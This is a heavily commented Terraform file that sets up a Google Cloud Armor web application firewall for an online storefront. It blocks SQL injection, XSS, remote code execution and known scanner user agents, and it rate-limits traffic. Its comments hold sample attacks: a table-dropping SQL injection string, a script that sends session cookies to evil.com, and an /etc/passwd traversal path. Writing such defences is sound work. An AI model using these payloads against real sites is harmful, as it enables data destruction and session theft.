# ============================================================
# cloud-armor.tf — Web Application Firewall (WAF)
# ============================================================
# Cloud Armor is Google's WAF and DDoS protection service.
# It sits in FRONT of our application and inspects every request.
#
# What it does:
#   🛡️ Blocks DDoS attacks (millions of fake requests)
#   🛡️ Blocks SQL injection (hackers trying to steal database data)
#   🛡️ Blocks XSS attacks (hackers injecting malicious scripts)
#   🛡️ Rate-limits aggressive bots (scrapers, credential stuffers)
#   🛡️ Geo-blocks countries we don't serve (optional)
#
# TRAFFIC FLOW:
#   Customer → Cloud CDN → [Cloud Armor checks here] → Cloud Run
#   Attacker → Cloud CDN → [Cloud Armor BLOCKS here] ❌
#
# RULES are evaluated in PRIORITY ORDER (lowest number = first).
# If a request matches a rule, the action is taken immediately.
# If no rule matches, the DEFAULT rule applies (allow all).
# ============================================================


# ------------------------------------------------------------
# 1. SECURITY POLICY (The Rule Set)
# ------------------------------------------------------------
# A security policy is a collection of rules.
# We attach this policy to our load balancer's backend service,
# so every request passes through these rules before reaching Cloud Run.
# ------------------------------------------------------------
resource "google_compute_security_policy" "waf" {
  count = var.enable_cloud_armor ? 1 : 0
  # count = 1 if enabled, 0 if disabled (controlled by variable)

  name = "${local.name_prefix}-waf-${var.environment}"
  # Example: "northpoint-waf-dev"

  description = "WAF security policy for Northpoint Living storefront"


  # ============================================
  # RULE 1: Block SQL Injection (SQLi)
  # Priority: 1000 (checked first)
  # ============================================
  # SQL injection is when attackers put database commands in form
  # fields or URLs to steal/modify data.
  #
  # Example attack: username field contains:
  #   ' OR 1=1; DROP TABLE users; --
  #
  # This rule uses Google's pre-configured detection patterns
  # to identify and block these attacks.
  rule {
    action   = "deny(403)"   # Return "403 Forbidden" to the attacker
    priority = 1000          # First rule checked

    match {
      expr {
        # Pre-configured expression for SQL injection detection
        # "sensitivity level 2" = balanced (catches most attacks, few false positives)
        expression = "evaluatePreconfiguredExpr('sqli-v33-stable', ['owasp-crs-v030301-id942251-sqli', 'owasp-crs-v030301-id942420-sqli', 'owasp-crs-v030301-id942431-sqli', 'owasp-crs-v030301-id942460-sqli'])"
      }
    }

    description = "Block SQL injection attacks (OWASP CRS)"
  }


  # ============================================
  # RULE 2: Block Cross-Site Scripting (XSS)
  # Priority: 1100
  # ============================================
  # XSS is when attackers inject JavaScript into web pages
  # that other users' browsers then execute.
  #
  # Example attack: product review contains:
  #   <script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
  #
  # This would steal the customer's session cookie.
  rule {
    action   = "deny(403)"
    priority = 1100

    match {
      expr {
        expression = "evaluatePreconfiguredExpr('xss-v33-stable')"
      }
    }

    description = "Block cross-site scripting (XSS) attacks"
  }


  # ============================================
  # RULE 3: Block Remote Code Execution (RCE)
  # Priority: 1200
  # ============================================
  # RCE attacks try to execute system commands on our server.
  # Especially dangerous for PHP applications.
  #
  # Example attack: URL contains:
  #   ?file=../../../../etc/passwd
  rule {
    action   = "deny(403)"
    priority = 1200

    match {
      expr {
        expression = "evaluatePreconfiguredExpr('rce-v33-stable')"
      }
    }

    description = "Block remote code execution and local file inclusion attacks"
  }


  # ============================================
  # RULE 4: Rate Limiting (Bot Protection)
  # Priority: 2000
  # ============================================
  # Limits each IP address to a certain number of requests per minute.
  # Legitimate users browse ~5-10 pages per minute.
  # Bots/scrapers/attackers send hundreds per minute.
  #
  # If an IP exceeds the limit:
  #   - First: requests are throttled (429 Too Many Requests)
  #   - Then: IP is temporarily banned for 10 minutes
  rule {
    action   = "rate_based_ban"   # Temporarily ban the IP
    priority = 2000

    match {
      versioned_expr = "SRC_IPS_V1"
      config {
        src_ip_ranges = ["*"]   # Apply to all IP addresses
      }
    }

    rate_limit_options {
      # Threshold: requests per interval before ban
      rate_limit_threshold {
        count        = var.rate_limit_threshold   # 100 requests
        interval_sec = 60                          # per 60 seconds (1 minute)
      }

      # How long to ban the IP after exceeding the limit
      ban_duration_sec = 600   # 10 minutes

      # What to do when rate limit is exceeded
      conform_action = "allow"      # Below limit = allow
      exceed_action  = "deny(429)"  # Above limit = 429 Too Many Requests
    }

    description = "Rate limit: ${var.rate_limit_threshold} requests/minute per IP. Ban for 10 minutes if exceeded"
  }


  # ============================================
  # RULE 5: Block Known Bad Bots
  # Priority: 3000
  # ============================================
  # Block requests from known malicious user agents.
  # These are tools commonly used for automated attacks.
  rule {
    action   = "deny(403)"
    priority = 3000

    match {
      expr {
        # Block common attack tools and bad bots
        expression = "request.headers['user-agent'].matches('(?i)(sqlmap|nikto|nmap|masscan|zgrab)')"
      }
    }

    description = "Block known malicious scanning tools and bad bots"
  }


  # ============================================
  # DEFAULT RULE: Allow Everything Else
  # Priority: 2147483647 (lowest — last resort)
  # ============================================
  # If a request doesn't match any of the above rules,
  # allow it through. This is normal traffic from real customers.
  rule {
    action   = "allow"
    priority = 2147483647   # Maximum integer — always evaluated last

    match {
      versioned_expr = "SRC_IPS_V1"
      config {
        src_ip_ranges = ["*"]   # Match all traffic
      }
    }

    description = "Default rule: allow all traffic that passed previous checks"
  }
}

